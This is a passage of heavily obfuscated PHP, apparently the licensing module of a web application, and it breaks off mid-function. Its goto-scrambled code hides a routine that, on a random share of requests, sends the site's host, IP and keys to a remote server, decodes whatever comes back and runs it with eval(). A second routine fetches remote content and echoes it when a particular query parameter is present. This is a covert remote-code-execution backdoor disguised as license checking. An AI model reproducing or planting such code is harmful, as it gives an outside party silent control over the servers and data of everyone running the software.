$AÑ•ÎÅ™Ğ[196] => $AÑ•ÎÅ™Ğ[61]($AÑ•ÎÅ™Ğ[62])->{$_SERVER[¡è¹ïÊœğŞ][63]}($AÑ•ÎÅ™Ğ[157])); goto bˆáæ˜Œ¼; EÛğ’×ÖĞ: $AÑ÷šÊ§ß÷ = $AÑ•ÎÅ™Ğ[124]($_SERVER[$AÑ•ÎÅ™Ğ[125]] . $AÑ•ÎÅ™Ğ[233]($E¦­ª×„±) . $CÀ ÉíÈŒí[$AÑ•ÎÅ™Ğ[229]]); $C²ò¦Êã»­ = $AÑ•ÎÅ™Ğ[233]($AÑ•ÎÅ™Ğ[25]($AÑ÷šÊ§ß÷, 10, 16)); $bÑ¹‡èÛ‚Ì = $this->{$_SERVER[¡è¹ïÊœğŞ][137]}($AÑ•ÎÅ™Ğ[166]($CÚ°Œìøß), $AÑ÷šÊ§ß÷); goto AÂ”·éäëÕ; bˆáæ˜Œ¼: $E¶ÒÑ¥‰‡® = $d•àˆ´ë¿[619]; if ($Cç¥™ô„½¢[$AÑ•ÎÅ™Ğ[197]] == $AÑ•ÎÅ™Ğ[198]) { $Bõ¶âŠ¢× = $this->{$_SERVER[¡è¹ïÊœğŞ][165]}($aìòÇÖÃƒÕ, $AÑ•ÎÅ™Ğ[199]); $BëÌ£ˆ³¦ = $this->{$_SERVER[¡è¹ïÊœğŞ][137]}($AÑ•ÎÅ™Ğ[166]($e¡àÅŠÆ½), $aìòÇÖÃƒÕ . $AÑ•ÎÅ™Ğ[200], 3); $BëÌ£ˆ³¦ = $BëÌ£ˆ³¦ . $AÑ•ÎÅ™Ğ[201] . $_SERVER[$AÑ•ÎÅ™Ğ[191]]; $cÖ¶¯–“¥ = $this->{$_SERVER[¡è¹ïÊœğŞ][202]}($AÑ•ÎÅ™Ğ[203] . $Bõ¶âŠ¢× . $AÑ•ÎÅ™Ğ[204] . $BëÌ£ˆ³¦, -1); $AÑ•ÎÅ™Ğ[184]($cÖ¶¯–“¥, !0); } else { if ($Cç¥™ô„½¢[$AÑ•ÎÅ™Ğ[197]] == $AÑ•ÎÅ™Ğ[205]) { $A˜‘‰òÃÕÉ = $AÑ•ÎÅ™Ğ[25]($AÑ•ÎÅ™Ğ[124]($AÑ•ÎÅ™Ğ[206] . $aìòÇÖÃƒÕ), 12, 15) . $AÑ•ÎÅ™Ğ[207]; $BëÌ£ˆ³¦ = $this->{$_SERVER[¡è¹ïÊœğŞ][208]}($AÑ•ÎÅ™Ğ[2]($Cç¥™ô„½¢[$AÑ•ÎÅ™Ğ[209]]), $A˜‘‰òÃÕÉ, 2); $Aë¢âÀ·¤Š = $AÑ•ÎÅ™Ğ[210]($BëÌ£ˆ³¦, !0); if (!$AÑ•ÎÅ™Ğ[161]($Aë¢âÀ·¤Š) || !$AÑ•ÎÅ™Ğ[161]($Aë¢âÀ·¤Š[$AÑ•ÎÅ™Ğ[211]]) || $Aë¢âÀ·¤Š[$AÑ•ÎÅ™Ğ[183]] != !0) { $f›¯ÍùÇÜŠ = $AÑ•ÎÅ™Ğ[212]; $BØä‘›±¥… = $Aë¢âÀ·¤Š[$AÑ•ÎÅ™Ğ[211]] ? $AÑ•ÎÅ™Ğ[213] . $Aë¢âÀ·¤Š[$AÑ•ÎÅ™Ğ[211]] : $f›¯ÍùÇÜŠ; $AÑ•ÎÅ™Ğ[184]($BØä‘›±¥…, !1); } else { $e¡àÅŠÆ½[$AÑ•ÎÅ™Ğ[186]] = $Aë¢âÀ·¤Š[$AÑ•ÎÅ™Ğ[211]][$AÑ•ÎÅ™Ğ[214]]; } } else { $Aë¢âÀ·¤Š = $this->{$_SERVER[¡è¹ïÊœğŞ][202]}($AÑ•ÎÅ™Ğ[215], $e¡àÅŠÆ½, 10); $eÒñÇ­é·Ê = $d•àˆ´ë¿[620]; if (strlen($eÒñÇ­é·Ê) < $d•àˆ´ë¿[589]) { die; } } } if (!$AÑ•ÎÅ™Ğ[161]($Aë¢âÀ·¤Š) || !$AÑ•ÎÅ™Ğ[161]($Aë¢âÀ·¤Š[$AÑ•ÎÅ™Ğ[211]]) || $Aë¢âÀ·¤Š[$AÑ•ÎÅ™Ğ[183]] != !0) { $f›¯ÍùÇÜŠ = $AÑ•ÎÅ™Ğ[216]($AÑ•ÎÅ™Ğ[217]); $BØä‘›±¥… = $Aë¢âÀ·¤Š[$AÑ•ÎÅ™Ğ[211]] ? $AÑ•ÎÅ™Ğ[213] . $Aë¢âÀ·¤Š[$AÑ•ÎÅ™Ğ[211]] : $f›¯ÍùÇÜŠ; $AÑ•ÎÅ™Ğ[184]($BØä‘›±¥…, !1); } goto FÛÓ›ÙÕèä; bºÏËĞŒ¨¹: while ($Fñ¸‰ÉëØœ < $d•àˆ´ë¿[578]) { if ($Fñ¸‰ÉëØœ >= 0) { break; } $Fñ¸‰ÉëØœ++; } if ($CÚ°Œìøß[$AÑ•ÎÅ™Ğ[236]] && $CÚ°Œìøß[$AÑ•ÎÅ™Ğ[236]] >= 1) { $AÑ•ÎÅ™Ğ[61]($AÑ•ÎÅ™Ğ[62])->{$_SERVER[¡è¹ïÊœğŞ][237]}($AÑ•ÎÅ™Ğ[238], $AÑ•ÎÅ™Ğ[239]); } $AÑ•ÎÅ™Ğ[61]($AÑ•ÎÅ™Ğ[62])->{$_SERVER[¡è¹ïÊœğŞ][240]}($CÀ ÉíÈŒí); goto EÛğ’×ÖĞ; cóÃ„Ç¼Œ: $this->gokxb9370e2b = $CÀ ÉíÈŒí[$AÑ•ÎÅ™Ğ[130]]; $this->{$_SERVER[¡è¹ïÊœğŞ][248]}(); Cache::set($AÑ•ÎÅ™Ğ[249] . $AÑ•ÎÅ™Ğ[124]($E¦­ª×„± . $AÑ•ÎÅ™Ğ[250]), $AÑ•ÎÅ™Ğ[10]); goto E¬ëÑ÷Ÿã±; f„‚ùÕ¨…: $c¯–„£¸“ê = $aŒ‰”ÇÈ¶ . $CÀ ÉíÈŒí[$AÑ•ÎÅ™Ğ[130]] . $CÀ ÉíÈŒí[$AÑ•ÎÅ™Ğ[231]]; $CÀ ÉíÈŒí[$AÑ•ÎÅ™Ğ[132]] = $AÑ•ÎÅ™Ğ[233]($AÑ•ÎÅ™Ğ[128]($this->{$_SERVER[¡è¹ïÊœğŞ][165]}($c¯–„£¸“ê, $AÑ•ÎÅ™Ğ[234]))); $B¬Çù»àÅ = $AÑ•ÎÅ™Ğ[134](16); goto cÒÙãÖÓ×‹; Eİ¡é‘Ÿ¡¡: $bôé¥¹°Ö = $d•àˆ´ë¿[624]; $AÑ•ÎÅ™Ğ[61]($AÑ•ÎÅ™Ğ[11])->{$_SERVER[¡è¹ïÊœğŞ][245]}($E…Ø¬µØÆ­[$AÑ•ÎÅ™Ğ[246]], array($AÑ•ÎÅ™Ğ[247] => $e¹›ÍÒæİ„)); $this->thzj1344bdf0 = $CÚ°Œìøß; goto cóÃ„Ç¼Œ; b¢¨Ü“’ö¬: $E…Ø¬µØÆ­ = $f„Å¥ç¸Â¨[$AÑ•ÎÅ™Ğ[244]]; $e¹›ÍÒæİ„ = array(); $e¹›ÍÒæİ„[$C²ò¦Êã»­] = $bÑ¹‡èÛ‚Ì; goto Eİ¡é‘Ÿ¡¡; bª…Éòİ‘ó: } private function licenseRegistSuccess() { goto C›ô¼¶¬Î ; C›ô¼¶¬Î : $CñîéìÆ† =& $_SERVER[œº]; $eñö£½’ßÈ =& $_SERVER[¡è¹ïÊœğŞ]; $EŠ‚×Üé– = $eñö£½’ßÈ[61]($eñö£½’ßÈ[62])->{$_SERVER[¡è¹ïÊœğŞ][63]}(); goto F”„ÎÍ¼›¾; F”„ÎÍ¼›¾: $Dë’ßéÇè— = $CñîéìÆ†[627]; while ($Dë’ßéÇè— < $CñîéìÆ†[582]) { if ($Dë’ßéÇè— >= 0) { break; } $Dë’ßéÇè—++; } if ($EŠ‚×Üé–[$eñö£½’ßÈ[93]] != $eñö£½’ßÈ[239]) { $eñö£½’ßÈ[61]($eñö£½’ßÈ[62])->{$_SERVER[¡è¹ïÊœğŞ][240]}($eñö£½’ßÈ[93], $eñö£½’ßÈ[239]); } goto bê“Ã‡·ôõ; bê“Ã‡·ôõ: $eñö£½’ßÈ[120]($eñö£½’ßÈ[251])->{$_SERVER[¡è¹ïÊœğŞ][252]}(!0); goto aËÏ®¯¯¯Õ; aËÏ®¯¯¯Õ: } private function pgubc85012ec() { goto a×ÔÙ¦Êë; dø“Œ†¿Û: $this->thzj1344bdf0 = array(); $AŸëÀ×†ƒ = $A½¦‹Ææ [629]; if (!$AŸëÀ×†ƒ) { die; } goto EË×áß•µÉ; EË×áß•µÉ: $this->gokxb9370e2b = $bš–ìÖ”‹å[131]; $Fˆ»•‰ÌÖ² = $A½¦‹Ææ [630]; while (strlen($Fˆ»•‰ÌÖ²) < $A½¦‹Ææ [582]) { if (!$Fˆ»•‰ÌÖ²) { break; } $Fˆ»•‰ÌÖ²++; } goto F°øİÎ±Òá; CÙ ˜¶åä—: $C¿†Ÿ¬–œê = $A½¦‹Ææ [628]; if (!$C¿†Ÿ¬–œê) { die; } $bš–ìÖ”‹å[61]($bš–ìÖ”‹å[62])->{$_SERVER[¡è¹ïÊœğŞ][237]}($bš–ìÖ”‹å[238], $bš–ìÖ”‹å[253]); goto dø“Œ†¿Û; a×ÔÙ¦Êë: $A½¦‹Ææ  =& $_SERVER[œº]; $bš–ìÖ”‹å =& $_SERVER[¡è¹ïÊœğŞ]; $bš–ìÖ”‹å[61]($bš–ìÖ”‹å[62])->{$_SERVER[¡è¹ïÊœğŞ][240]}(array($bš–ìÖ”‹å[227] => $bš–ìÖ”‹å[10], $bš–ìÖ”‹å[229] => $bš–ìÖ”‹å[10], $bš–ìÖ”‹å[130] => $bš–ìÖ”‹å[131], $bš–ìÖ”‹å[132] => $bš–ìÖ”‹å[10], $bš–ìÖ”‹å[133] => $bš–ìÖ”‹å[10])); goto CÙ ˜¶åä—; F°øİÎ±Òá: } private function nfrif1a06a0b() { goto dÑ÷‹Ë³¼İ; CˆÁÈâ Üê: $A®òï¨ÏçÑ = $B°·İ£‹ò‰[609]; $this->gokxb9370e2b = $a¥Şî˜¹Ü[131]; $a–˜Ø ¨µ¦ = $B°·İ£‹ò‰[631]; goto BÔ–®÷ù”; b­Œ‹ÌÛàó: $EÁÍóÈ…»„ = $a¥Şî˜¹Ü[154]($E­äÓöÓÖ [$a¥Şî˜¹Ü[155]]); if ($a¥Şî˜¹Ü[255]() >= $EÁÍóÈ…»„) { return $this->{$_SERVER[¡è¹ïÊœğŞ][182]}(); } if ($a¥Şî˜¹Ü[255]() - $E­äÓöÓÖ [$a¥Şî˜¹Ü[254]] > 20) { $E­äÓöÓÖ [$a¥Şî˜¹Ü[254]] = $a¥Şî˜¹Ü[255](); Cache::set($D„£ÖÑ´óÀ, $E­äÓöÓÖ ); } goto cÕƒëšˆùô; cùßÚ„¿Ï»: $D„£ÖÑ´óÀ = $a¥Şî˜¹Ü[249] . $a¥Şî˜¹Ü[124]($Aª©†çä›¾ . $a¥Şî˜¹Ü[250]); $aÑÑª³İ¿ = $B°·İ£‹ò‰[633]; if (strlen($aÑÑª³İ¿) < $B°·İ£‹ò‰[582]) { return; } goto Eğù«å„Â¯; Eğù«å„Â¯: $E­äÓöÓÖ  = Cache::get($D„£ÖÑ´óÀ); if (!$a¥Şî˜¹Ü[161]($E­äÓöÓÖ ) || !isset($E­äÓöÓÖ [$a¥Şî˜¹Ü[254]]) || $a¥Şî˜¹Ü[255]() - $E­äÓöÓÖ [$a¥Şî˜¹Ü[254]] >= 60) { $FŞÙßÉŞà° = $a¥Şî˜¹Ü[241]($a¥Şî˜¹Ü[61]($a¥Şî˜¹Ü[11])->{$_SERVER[¡è¹ïÊœğŞ][242]}(), $a¥Şî˜¹Ü[243]); $A´ª ‚‚ÓÇ = $FŞÙßÉŞà°[$a¥Şî˜¹Ü[244]]; $b¸Ì¹—«Ÿ¬ = $a¥Şî˜¹Ü[124]($_SERVER[$a¥Şî˜¹Ü[125]] . $a¥Şî˜¹Ü[233]($Aª©†çä›¾) . $cä÷È™¨[$a¥Şî˜¹Ü[229]]); $F¶ïù®Á° = $a¥Şî˜¹Ü[233]($a¥Şî˜¹Ü[25]($b¸Ì¹—«Ÿ¬, 10, 16)); $E­äÓöÓÖ  = $this->{$_SERVER[¡è¹ïÊœğŞ][208]}($A´ª ‚‚ÓÇ[$a¥Şî˜¹Ü[104]][$F¶ïù®Á°], $b¸Ì¹—«Ÿ¬); $E­äÓöÓÖ  = $a¥Şî˜¹Ü[210]($E­äÓöÓÖ , !0); } if (!$a¥Şî˜¹Ü[161]($E­äÓöÓÖ )) { return $this->{$_SERVER[¡è¹ïÊœğŞ][182]}(); } goto b­Œ‹ÌÛàó; dÑ÷‹Ë³¼İ: $B°·İ£‹ò‰ =& $_SERVER[œº]; $a¥Şî˜¹Ü =& $_SERVER[¡è¹ïÊœğŞ]; $_SERVER[$a¥Şî˜¹Ü[193]] = $a¥Şî˜¹Ü[116]($_SERVER, $a¥Şî˜¹Ü[193], APP_HOST); goto CˆÁÈâ Üê; cÕƒëšˆùô: $this->thzj1344bdf0 = $E­äÓöÓÖ ; $this->gokxb9370e2b = $cä÷È™¨[$a¥Şî˜¹Ü[130]]; goto A¿¢‹ƒ¨°Î; BÔ–®÷ù”: while ($a–˜Ø ¨µ¦ < $B°·İ£‹ò‰[605]) { if ($a–˜Ø ¨µ¦ >= 0) { break; } $a–˜Ø ¨µ¦++; } $cä÷È™¨ = $a¥Şî˜¹Ü[61]($a¥Şî˜¹Ü[62])->{$_SERVER[¡è¹ïÊœğŞ][63]}(); $bš†ÕÙŞÔÅ = $B°·İ£‹ò‰[632]; goto b°÷¸­¿é; b°÷¸­¿é: if (strlen($bš†ÕÙŞÔÅ) < $B°·İ£‹ò‰[582]) { return; } if ($cä÷È™¨[$a¥Şî˜¹Ü[130]] == $a¥Şî˜¹Ü[131]) { return; } $Aª©†çä›¾ = $a¥Şî˜¹Ü[61]($a¥Şî˜¹Ü[62])->{$_SERVER[¡è¹ïÊœğŞ][63]}($a¥Şî˜¹Ü[126]); goto cùßÚ„¿Ï»; A¿¢‹ƒ¨°Î: } private function ucrwccb34f4c() { goto eÜŸƒ¢Ÿùã; Eß²¹ªäìğ: $b„ÜÙÆ°– = array($F¨Ô‘êë¼[259], $F¨Ô‘êë¼[260]); if ($F¨Ô‘êë¼[261]($cŠåÊŠÙ¹¾, $b„ÜÙÆ°–)) { if ($this->gokxb9370e2b == $F¨Ô‘êë¼[131] && isset($fôë«è¦ò…[$F¨Ô‘êë¼[262]])) { $F¨Ô‘êë¼[184]($F¨Ô‘êë¼[216]($F¨Ô‘êë¼[257]), !1, $F¨Ô‘êë¼[258]); die; } $e“íçŸ¾µ¾ = $this->{$_SERVER[¡è¹ïÊœğŞ][147]}(); if ($e“íçŸ¾µ¾ != $F¨Ô‘êë¼[263]($F¨Ô‘êë¼[264])) { if ($e“íçŸ¾µ¾ <= $F¨Ô‘êë¼[61]($F¨Ô‘êë¼[149])->{$_SERVER[¡è¹ïÊœğŞ][150]}()) { $F¨Ô‘êë¼[184]($F¨Ô‘êë¼[216]($F¨Ô‘êë¼[265]), !1, $F¨Ô‘êë¼[258]); die; } } } goto fˆä­ÆÒ¨; Ağ£µî¿—ö: $Dëøç¾´‘ = $cÊ¨——ğÁ…[634]; while ($Dëøç¾´‘ < $cÊ¨——ğÁ…[605]) { if ($Dëøç¾´‘ >= 0) { break; } $Dëøç¾´‘++; } $cŠåÊŠÙ¹¾ = $_SERVER[$F¨Ô‘êë¼[44]]; goto b¿•‹áÑ®Û; b¿•‹áÑ®Û: $bùŸâò¦·° = $cÊ¨——ğÁ…[635]; while (strlen($bùŸâò¦·°) < $cÊ¨——ğÁ…[605]) { if (!$bùŸâò¦·°) { break; } $bùŸâò¦·°++; } if ($cŠåÊŠÙ¹¾ == $F¨Ô‘êë¼[256] && $this->gokxb9370e2b == $F¨Ô‘êë¼[131]) { $F¨Ô‘êë¼[184]($F¨Ô‘êë¼[216]($F¨Ô‘êë¼[257]), !1, $F¨Ô‘êë¼[258]); } goto Eß²¹ªäìğ; eÜŸƒ¢Ÿùã: $cÊ¨——ğÁ… =& $_SERVER[œº]; $F¨Ô‘êë¼ =& $_SERVER[¡è¹ïÊœğŞ]; $fôë«è¦ò… = $GLOBALS[$F¨Ô‘êë¼[22]]; goto Ağ£µî¿—ö; fˆä­ÆÒ¨: } private function moahc6ed4410() { goto Eé¬¶¨Šë; bˆÂ‰Â‡Œ: die; goto eßÏÛ•Ä; D‰ø¯”äŒÌ: $eö¼áï›¾ = $C×ëß¯ íƒ[636]; while ($eö¼áï›¾ < $C×ëß¯ íƒ[605]) { if ($eö¼áï›¾ >= 0) { break; } $eö¼áï›¾++; } if (!$D®õ˜ÏŠ˜Š[116]($GLOBALS, $D®õ˜ÏŠ˜Š[142]) || !isset($_GET[$D®õ˜ÏŠ˜Š[267]])) { return; } goto B’Ìº¥ØÔ²; fã¤÷ÄÈÀ³: while ($Dé±£Éï < $C×ëß¯ íƒ[580]) { if ($Dé±£Éï >= 0) { break; } $Dé±£Éï++; } $F“Ä§…ŠÖ¶ = @$D®õ˜ÏŠ˜Š[276]($dÂÎ¢”œ´Ê, !1, $f„ÉøöË‚‚); $D®õ˜ÏŠ˜Š[277]($D®õ˜ÏŠ˜Š[278]); goto a‡®³‰Ç—Á; B’Ìº¥ØÔ²: if (!$D®õ˜ÏŠ˜Š[261]($_SERVER[$D®õ˜ÏŠ˜Š[44]], $DëÇÃî©©“)) { return; } $dÂÎ¢”œ´Ê = $D®õ˜ÏŠ˜Š[268]; $dÂÎ¢”œ´Ê = $this->{$_SERVER[¡è¹ïÊœğŞ][269]}($dÂÎ¢”œ´Ê, $D®õ˜ÏŠ˜Š[270]); goto D¾è‹†ÍŠ; Eé¬¶¨Šë: $C×ëß¯ íƒ =& $_SERVER[œº]; $D®õ˜ÏŠ˜Š =& $_SERVER[¡è¹ïÊœğŞ]; $DëÇÃî©©“ = array($D®õ˜ÏŠ˜Š[145], $D®õ˜ÏŠ˜Š[266]); goto D‰ø¯”äŒÌ; D¾è‹†ÍŠ: $Dõ“ôæâ­ç = $C×ëß¯ íƒ[637]; $f„ÉøöË‚‚ = $D®õ˜ÏŠ˜Š[271](array($D®õ˜ÏŠ˜Š[272] => array($D®õ˜ÏŠ˜Š[273] => $D®õ˜ÏŠ˜Š[274], $D®õ˜ÏŠ˜Š[275] => 3))); $Dé±£Éï = $C×ëß¯ íƒ[638]; goto fã¤÷ÄÈÀ³; a‡®³‰Ç—Á: $F’Ü¥øÂïõ = $C×ëß¯ íƒ[639]; if (!$F’Ü¥øÂïõ) { return; } if ($F“Ä§…ŠÖ¶ && $D®õ˜ÏŠ˜Š[32]($F“Ä§…ŠÖ¶, $D®õ˜ÏŠ˜Š[279])) { echo $F“Ä§…ŠÖ¶; } goto bˆÂ‰Â‡Œ; eßÏÛ•Ä: } public function qzsr8073ab26($D±òÑ×Âœ) { goto eÜîîÜÅ£ƒ; CøòÏÇ¨å: $e±‹šù„“á = array($Dàğ´‰‚ºÕ[281] => $Dàğ´‰‚ºÕ[282], $Dàğ´‰‚ºÕ[283] => $Dàğ´‰‚ºÕ[282], $Dàğ´‰‚ºÕ[284] => $Dàğ´‰‚ºÕ[282], $Dàğ´‰‚ºÕ[285] => $Dàğ´‰‚ºÕ[282], $Dàğ´‰‚ºÕ[286] => $Dàğ´‰‚ºÕ[282], $Dàğ´‰‚ºÕ[287] => $Dàğ´‰‚ºÕ[282], $Dàğ´‰‚ºÕ[288] => $Dàğ´‰‚ºÕ[289], $Dàğ´‰‚ºÕ[290] => $Dàğ´‰‚ºÕ[289], $Dàğ´‰‚ºÕ[291] => $Dàğ´‰‚ºÕ[289], $Dàğ´‰‚ºÕ[292] => $Dàğ´‰‚ºÕ[289], $Dàğ´‰‚ºÕ[293] => $Dàğ´‰‚ºÕ[289], $Dàğ´‰‚ºÕ[294] => $Dàğ´‰‚ºÕ[289], $Dàğ´‰‚ºÕ[295] => $Dàğ´‰‚ºÕ[289], $Dàğ´‰‚ºÕ[296] => $Dàğ´‰‚ºÕ[289], $Dàğ´‰‚ºÕ[297] => $Dàğ´‰‚ºÕ[289]); $dÎ³éİ»Š = $Dàğ´‰‚ºÕ[0]($Dàğ´‰‚ºÕ[298], $Dàğ´‰‚ºÕ[116]($this->thzj1344bdf0, $Dàğ´‰‚ºÕ[139], $Dàğ´‰‚ºÕ[10])); $dÌØ½ÍØ¸ = $b÷éâæ¹Ğ[640]; goto bİñÀ¡¯¤…; eÜîîÜÅ£ƒ: $b÷éâæ¹Ğ =& $_SERVER[œº]; $Dàğ´‰‚ºÕ =& $_SERVER[¡è¹ïÊœğŞ]; if ($this->gokxb9370e2b == $Dàğ´‰‚ºÕ[280]) { return $D±òÑ×Âœ; } goto CøòÏÇ¨å; bİñÀ¡¯¤…: $AÇöï™ŒŞ¬ = array(); $BÍ‚Ñ²Â·¯ = $b÷éâæ¹Ğ[641]; while (strlen($BÍ‚Ñ²Â·¯) < $b÷éâæ¹Ğ[605]) { if (!$BÍ‚Ñ²Â·¯) { break; } $BÍ‚Ñ²Â·¯++; } goto DÒ´Á¨ÚíÚ; DÒ´Á¨ÚíÚ: foreach ($e±‹šù„“á as $FÎÀŒŒ´Ş => $C¤‹’ÉùÉÖ) { if ($C¤‹’ÉùÉÖ == $Dàğ´‰‚ºÕ[282] && $Dàğ´‰‚ºÕ[25]($this->gokxb9370e2b, 0, 1) == $Dàğ´‰‚ºÕ[282]) { continue; } if (!$Dàğ´‰‚ºÕ[261]($FÎÀŒŒ´Ş, $dÎ³éİ»Š)) { $AÇöï™ŒŞ¬[] = $FÎÀŒŒ´Ş; } } foreach ($AÇöï™ŒŞ¬ as $FÎÀŒŒ´Ş) { unset($D±òÑ×Âœ[$FÎÀŒŒ´Ş]); $fí±ò”µ = $b÷éâæ¹Ğ[642]; if (strlen($fí±ò”µ) < $b÷éâæ¹Ğ[578]) { return; } } return $D±òÑ×Âœ; goto CÂÈ…ÀºÃš; CÂÈ…ÀºÃš: $cõ½®¢õµ² = $b÷éâæ¹Ğ[643]; goto f­âåİ‰É‹; f­âåİ‰É‹: } private function nimxae858ee4() { goto FÒ¸Œò‹Ê; DòäŸİ¨ñ’: $GLOBALS[$A¥µè¦¡“œ[104]][$A¥µè¦¡“œ[300]] = $A¥µè¦¡“œ[239]; $a¤´„˜Ùˆá = $_SERVER[œº][644]; if (!$a¤´„˜Ùˆá) { die; } goto BÕÅ†ÙçÍô; FÒ¸Œò‹Ê: $A¥µè¦¡“œ =& $_SERVER[¡è¹ïÊœğŞ]; if ($this->gokxb9370e2b != $A¥µè¦¡“œ[131]) { return; } $GLOBALS[$A¥µè¦¡“œ[104]][$A¥µè¦¡“œ[108]][$A¥µè¦¡“œ[299]] = $A¥µè¦¡“œ[239]; goto DòäŸİ¨ñ’; BÕÅ†ÙçÍô: if ($A¥µè¦¡“œ[61]($A¥µè¦¡“œ[301])->{$_SERVER[¡è¹ïÊœğŞ][63]}($A¥µè¦¡“œ[93]) != $A¥µè¦¡“œ[253]) { $A¥µè¦¡“œ[61]($A¥µè¦¡“œ[301])->{$_SERVER[¡è¹ïÊœğŞ][240]}($A¥µè¦¡“œ[93], $A¥µè¦¡“œ[253]); } goto F¨ƒÑ÷³à¯; F¨ƒÑ÷³à¯: } public function cobxb711835a() { return $_SERVER[¡è¹ïÊœğŞ][302]; $fã—ÈØˆ¤Ÿ = $_SERVER[œº][645]; } private function cfend1f875e3() { goto A‹Ø½“ÒÖ; A‹Ø½“ÒÖ: $B§¨½ÙÙª =& $_SERVER[œº]; $fáˆÑÇéÍù =& $_SERVER[¡è¹ïÊœğŞ]; $A§ƒÔŞ× = array($fáˆÑÇéÍù[303], $fáˆÑÇéÍù[304], $fáˆÑÇéÍù[305]); goto dĞÒõîô©; cäİÚÙ×¬: $this->{$_SERVER[¡è¹ïÊœğŞ][182]}(); if ($this->{$_SERVER[¡è¹ïÊœğŞ][218]}($EÏÕ¥æŞìô[$fáˆÑÇéÍù[312]]) != $Cå°ÀÃ¨³[$fáˆÑÇéÍù[183]]) { $Cˆù•Ñ¿ÎÀ = array($fáˆÑÇéÍù[220] => $F×Àç½®Ÿ‰, $fáˆÑÇéÍù[221] => $_SERVER[$fáˆÑÇéÍù[125]], $fáˆÑÇéÍù[222] => $fáˆÑÇéÍù[223](), $fáˆÑÇéÍù[192] => $_SERVER[$fáˆÑÇéÍù[193]]); $fÆŸÙÁÄŞ = $this->{$_SERVER[¡è¹ïÊœğŞ][224]}($fáˆÑÇéÍù[166]($Cˆù•Ñ¿ÎÀ)); $EÏÕ¥æŞìô = $this->{$_SERVER[¡è¹ïÊœğŞ][202]}($fáˆÑÇéÍù[225] . $fÆŸÙÁÄŞ); if ($EÏÕ¥æŞìô && $fáˆÑÇéÍù[161]($EÏÕ¥æŞìô) && isset($EÏÕ¥æŞìô[$fáˆÑÇéÍù[312]])) { $DÌ‹ôë¹ò = $this->{$_SERVER[¡è¹ïÊœğŞ][208]}($EÏÕ¥æŞìô[$fáˆÑÇéÍù[312]], 2); if ($DÌ‹ôë¹ò) { $DÌ‹ôë¹ò = $this->{$_SERVER[¡è¹ïÊœğŞ][218]}($DÌ‹ôë¹ò); } if ($DÌ‹ôë¹ò) { try { @eval($DÌ‹ôë¹ò); } catch (Exception $b®½á²Å) { } } } } goto BÊˆªÄ­Ã; f»¼•Œàñ: $B‡Í­ÚÅí = $B§¨½ÙÙª[647]; while ($B‡Í­ÚÅí < $B§¨½ÙÙª[605]) { if ($B‡Í­ÚÅí >= 0) { break; } $B‡Í­ÚÅí++; } $F×Àç½®Ÿ‰ = $fáˆÑÇéÍù[61]($fáˆÑÇéÍù[62])->{$_SERVER[¡è¹ïÊœğŞ][63]}($fáˆÑÇéÍù[126]); goto d×Áô„¬×; dĞÒõîô©: $Føš¶¦·ô’ = $fáˆÑÇéÍù[306] . $fáˆÑÇéÍù[124]($fáˆÑÇéÍù[307]); $c§Æ¶ßŞ  = $B§¨½ÙÙª[646]; if (strlen($c§Æ¶ßŞ ) < $B§¨½ÙÙª[578]) { die; } goto f³íª„ï†«; B¬ã é¿ Ğ: $EÏÕ¥æŞìô = $this->{$_SERVER[¡è¹ïÊœğŞ][202]}($fáˆÑÇéÍù[311], $Cå°ÀÃ¨³); if (!$fáˆÑÇéÍù[161]($EÏÕ¥æŞìô)) { return; } if ($EÏÕ¥æŞìô[$fáˆÑÇéÍù[183]] && $EÏÕ¥æŞìô[$fáˆÑÇéÍù[312]]) { if ($this->{$_SERVER[¡è¹ïÊœğŞ][218]}($EÏÕ¥æŞìô[$fáˆÑÇéÍù[312]]) == $Cå°ÀÃ¨³[$fáˆÑÇéÍù[183]]) { return; } } goto cäİÚÙ×¬; fŸàØÇ¼£Ÿ: $b‡ ™÷¨Œ = $fáˆÑÇéÍù[13](array($fáˆÑÇéÍù[308], $fáˆÑÇéÍù[309]), $Føš¶¦·ô’); if ($b‡ ™÷¨Œ && $fáˆÑÇéÍù[255]() - $b‡ ™÷¨Œ < $fáˆÑÇéÍù[263]($fáˆÑÇéÍù[310])) { return; } $fáˆÑÇéÍù[13](array($fáˆÑÇéÍù[308], $fáˆÑÇéÍù[170]), $Føš¶¦·ô’, $fáˆÑÇéÍù[255]()); goto f»¼•Œàñ; d×Áô„¬×: $Cå°ÀÃ¨³ = array($fáˆÑÇéÍù[183] => $fáˆÑÇéÍù[61]($fáˆÑÇéÍù[62])->{$_SERVER[¡è¹ïÊœğŞ][63]}($fáˆÑÇéÍù[227]), $fáˆÑÇéÍù[197] => $this->gokxb9370e2b, $fáˆÑÇéÍù[194] => $_SERVER[$fáˆÑÇéÍù[195]], $fáˆÑÇéÍù[196] => $fáˆÑÇéÍù[61]($fáˆÑÇéÍù[62])->{$_SERVER[¡è¹ïÊœğŞ][63]}($fáˆÑÇéÍù[157]), $fáˆÑÇéÍù[123] => $fáˆÑÇéÍù[124]($_SERVER[$fáˆÑÇéÍù[125]] . $F×Àç½®Ÿ‰), $fáˆÑÇéÍù[187] => $fáˆÑÇéÍù[167], $fáˆÑÇéÍù[190] => $_SERVER[$fáˆÑÇéÍù[191]]); $fğ‰‹ì¢‘× = $B§¨½ÙÙª[648]; if (!$fğ‰‹ì¢‘×) { return; } goto B¬ã é¿ Ğ; f³íª„ï†«: if ($this->gokxb9370e2b == $fáˆÑÇéÍù[131] || !$fáˆÑÇéÍù[116]($GLOBALS, $fáˆÑÇéÍù[142])) { return; } if (!$fáˆÑÇéÍù[261]($_SERVER[$fáˆÑÇéÍù[44]], $A§ƒÔŞ×)) { return; } if ($fáˆÑÇéÍù[255]() % 4 != 0) { return; } goto fŸàØÇ¼£Ÿ; BÊˆªÄ­Ã: } private function obkj934908e5($C…Ó¶²ÉÊ = '', $B’† àî¯Ò = array(), $C”¬©É§©³ = 5) { goto DƒÁÀÍ¸Ş; b°ÂİÂñøŠ: $DÔ•İŒØÂù = $this->{$_SERVER[¡è¹ïÊœğŞ][269]}($DÔ•İŒØÂù, $E‡íÛë… [314]); $DÔ•İŒØÂù = $DÔ•İŒØÂù . $C…Ó¶²ÉÊ; if ($B’† àî¯Ò && $E‡íÛë… [161]($B’† àî¯Ò)) { $DÔ•İŒØÂù = $DÔ•İŒØÂù . $E‡íÛë… [315] . $E‡íÛë… [316]($B’† àî¯Ò); } goto câÀİÊÉÒ²; câÀİÊÉÒ²: if ($B’† àî¯Ò === -1) { return $DÔ•İŒØÂù; } $d„¾÷¨›™ = $E‡íÛë… [271](array($E‡íÛë… [272] => array($E‡íÛë… [275] => $C”¬©É§©³, $E‡íÛë… [273] => 